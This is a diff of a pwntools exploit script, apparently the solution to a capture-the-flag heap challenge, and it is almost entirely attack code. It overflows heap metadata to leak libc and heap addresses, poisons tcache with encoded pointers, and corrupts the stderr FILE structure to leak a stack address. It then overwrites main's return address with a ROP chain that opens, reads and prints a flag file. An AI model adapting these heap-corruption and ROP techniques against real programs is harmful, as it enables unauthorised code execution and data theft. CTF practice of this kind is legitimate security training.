@@ -51,15 +51,14 @@ def get_idx():
 
 	raise Exception("BAD")
 
-def alloc(size, content):
-	# memset(ptr, 0, size)
+def alloc(size, content=b''):
 	sla(b'Command: ', b'1')
 	sla(b'Size: ', str(size).encode())
 	if size:
 		sla(b'Content: ', content)
 
 	idx = get_idx()
-	print(f'Alloc: {idx}')
+	# print(f'Alloc: {idx} {content}')
 	return idx
 	
 
@@ -82,107 +81,128 @@ def view(idx):
 def exit():
 	sla(b'Command: ', b'5')
 
-alloc(0x10, b'11')
-kuba = alloc(0x10, b'22')
-alloc(0x600, b'22')
-alloc(0x10, b'33')
-alloc(0x600, b'22')
-alloc(0x30, b'33')
+def protect_ptr(pos, ptr):
+	return (pos >> 12) ^ ptr
 
-update(0, -0x10, b'B' * 0x10 + p64(0) + p64(0x81))
-free(1)
-alloc(0x70, b'B' * 0x18 + p64(0x611))
-free(2)
-free(4)
-leak = view(1)
-leak = leak[len(b'Chunk[1]: BBBBBBBBBBBBBBBBBBBBBBBB\x11\x06\x00\x00\x00\x00\x00\x00'):]
+
+li("Leaking heap & libc")
+overwriter = alloc(0x10, b'11')
+fake_size_chunk = alloc(0x10, b'22')
+un1 = alloc(0x600, b'unsorted1')
+alloc(0x10, b'33')
+un2 = alloc(0x600, b'unsorted2')
+alloc(0x10, b'33')
+
+update(overwriter, -1, flat(
+	b'B' * 0x10, 
+	0, 
+	0x81
+))
+
+# free chunk with fake size (0x70) and alloc it again (set the size of next chunk to 0x600, because free(un1) will fail)
+free(fake_size_chunk)	
+leaker = alloc(0x70, flat(		
+	b'B' * 0x18, 
+	0x611
+))
+
+free(un1)
+free(un2)
+
+leak = view(leaker)
+leak = leak.removeprefix(b'Chunk[1]: BBBBBBBBBBBBBBBBBBBBBBBB' + p64(0x611))
 libc_leak = u64(leak[:8])
 heap_leak = u64(leak[8:16])
-li(f'libc leak {hex(libc_leak)}')
-li(f'heap leak {hex(heap_leak)}')
+ls(f'libc leak {hex(libc_leak)}')
+ls(f'heap leak {hex(heap_leak)}')
 
 libc_base = libc_leak - 0x219ce0
 heap_base = heap_leak - 0x900
-li(f'libc leak {hex(libc_base)}')
-li(f'heap base {hex(heap_base)}')
+ls(f'libc leak {hex(libc_base)}')
+ls(f'heap base {hex(heap_base)}')
 
 libc = ELF("./libc.so.6")
 libc.address = libc_base
-# partial relro ^
-
-# fix & cleanup heap
-update(0, -0x10, b'B' * 0x10 + p64(0) + p64(0x21))
-free(3)
-free(1)
-alloc(0x600, b'XXXXX')
-alloc(0x600, b'XXXXX')
-
 environ = libc.symbols['_environ']
-stdout_fake_ptrs = libc.address + 0x21a803
 std_err = libc.symbols['_IO_2_1_stderr_']
 
-# fake tcache ptr
-# 2b0 - chunk location
-enc_ptr = std_err ^ ((heap_base + 0x2b0) >> 12)
-update(0, -0x10, b'B' * 0x10 + p64(0) + p64(0x21) + p64(enc_ptr)[:-1])
+# restore leaker size and free it
+update(overwriter, -1, flat(
+	b'B' * 0x10, 
+	0, 
+	0x21, 
+))
+free(alloc(0x10, b'AA'))  # put sth on tcache list (because of tcache bins count)
+free(leaker)
 
-alloc(0x10, b'AA')
+# poison tcache 0x20
+enc_ptr = protect_ptr(
+	heap_base + 0x2b0,  # where the chunk is
+	std_err				# where we want to point
+)
 
-# std_err chunk
-idx = alloc(0x10, b'CC')
-# update(idx, -0x10,
-# 		b'A' * 0xe0 +
-# 		p64(0x0000000fbad2887) +
-# 		p64(stdout_fake_ptrs) +
-# 		p64(stdout_fake_ptrs) +
-# 		p64(stdout_fake_ptrs) +
-# 		p64(stdout_fake_ptrs) +
-# 		p64(stdout_fake_ptrs) +
-# 		p64(stdout_fake_ptrs) +
-# 		p64(stdout_fake_ptrs)
-# 	)
+update(overwriter, -1, flat(
+	b'B' * 0x10, 
+	0, 
+	0x21, 
+	p64(enc_ptr)[:-1]    # because read_bytes adds null byte, we dont want to overwrite tcache key, so strip last byte (null byte)
+))
 
-update(idx, -0x10,
-		b'A' * 0xe0 +
-		p64(0xfbad1800) + # _flags
-		p64(environ) * 3 + # _IO_read_*
-		p64(environ) + # _IO_write_base
-		p64(environ + 0x8)*2 + # _IO_write_ptr + _IO_write_end
-		p64(environ + 8) + # _IO_buf_base
-		p64(environ + 8)
-	)
+evil = alloc(0x10, b'AA')
+
+# chunk in stderr
+stderr = alloc(0x10, b'CC')
+update(stderr, -1, flat(
+	b'A' * 0xe0,
+	0xfbad1800,						# _flags
+	environ, environ, environ,		# _IO_read_*
+	environ,						# _IO_write_base
+	environ + 0x8, environ + 0x8,	# _IO_write_ptr + _IO_write_end
+	environ + 0x8,					# _IO_buf_base
+	environ + 0x8					# _IO_buf_end
+))
 
 stack_leak = rl()
 stack_leak = u64(stack_leak[:8])
-li(f'stack leak {hex(stack_leak)}')
+ls(f'stack leak {hex(stack_leak)}')
 
-ret_from_main = stack_leak - 0x120 - 8
-li(f'ret_from_main {hex(ret_from_main)}')
+ret_from_main = stack_leak - 0x120  	
+ls(f'ret_from_main {hex(ret_from_main)}')
+alignment = stack_leak % 0x10
+ret_from_main -= alignment 			# align to 0x10
+ls(f'ret_from_main aligned {hex(ret_from_main)}')
 
 
-idx = alloc(0x30, b'rop prep')
-idx2 = alloc(0x80, b'AA')
-alloc(0x30, b'no collapse')
-free(alloc(0x80, b'AA'))
-free(idx2)
-enc_ptr = ret_from_main ^ ((heap_base + 0xf90) >> 12)
-update(idx, -0x10, b'B' * 0x30 + p64(0) + p64(0x91) + p64(enc_ptr)[:-1])
+free(alloc(0x10)) 					# put sth on tcache list (because of tcache bins count)
+free(evil)
 
-alloc(0x80, b'AA')
+enc_ptr = protect_ptr(
+	heap_base + 0x2b0,  		# where the chunk is
+	ret_from_main				# where we want to point
+)
 
-read_to = heap_base + 0x2b0
-rop = ROP(libc, base=ret_from_main+8)
+update(overwriter, -1, flat(
+	b'B' * 0x10,
+	0,
+	0x21,
+	p64(enc_ptr)[:-1]
+))
+
+evil = alloc(0x10, b'AA')
+
+read_to = heap_base
+rop = ROP(libc, base=ret_from_main+alignment)
 rop.call('syscall', [2, b"./flag", 0, 0])
 rop.call("read", [3, read_to, 0x40])
 rop.call("puts", [read_to])
-rop.call("exit")
+rop.call('syscall', [0x3c, 0])	# we are gentlemen
 print(rop.dump())
 
-# chunk on stack
-final = alloc(0x80, p64(0))
-update(final, -0x10, p64(0) + rop.chain())
+# chunk on stack, overwrites retaddr from main
+final = alloc(0x10, p64(0))
+update(final, -1, flat(b'A' * alignment, rop.chain()))
 
-exit()
+exit() # trigger ROP
 
 ia()
 
